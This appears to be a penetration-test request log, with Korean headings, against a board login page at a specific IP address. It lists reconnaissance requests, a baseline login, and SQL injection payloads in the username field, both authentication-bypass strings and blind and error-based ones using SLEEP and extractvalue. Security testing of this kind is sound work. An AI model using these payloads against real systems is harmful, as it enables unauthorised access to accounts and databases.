# All Requests — board-login

## 요청 1 (CTL-RECON-001)

```
GET / HTTP/1.1
Host: 3.38.185.178
```

## 요청 2 (CTL-RECON-002)

```
GET /board/login.php HTTP/1.1
Host: 3.38.185.178
```

## 요청 3 (CTL-RECON-003)

```
GET /robots.txt HTTP/1.1
Host: 3.38.185.178

GET /board/ HTTP/1.1
Host: 3.38.185.178
```

## 요청 4 (CTL-EXEC-001, baseline)

```
POST /board/login.php HTTP/1.1
Host: 3.38.185.178
Cookie: PHPSESSID=<session>
Content-Type: application/x-www-form-urlencoded

csrf_token=<session-bound token>&username=nonexistent_test_1234&password=whatever123
```

## 요청 5 (CTL-EXEC-002, 직접 SQLi 우회 시도 3건, 동일 세션)

```
POST /board/login.php (username 필드만 교체, password=whatever123 고정)
  1) username=admin' -- 
  2) username=' OR '1'='1' -- 
  3) username=' OR 1=1 -- -
```

## 요청 6 (CTL-EXEC-003, blind/error-based SQLi 시도 3건, 동일 세션)

```
POST /board/login.php (username 필드만 교체, password=whatever123 고정)
  1) username=admin' AND SLEEP(5)-- -
  2) username=admin' AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -
  3) username=admin' AND extractvalue(1,concat(0x7e,version()))-- -
```
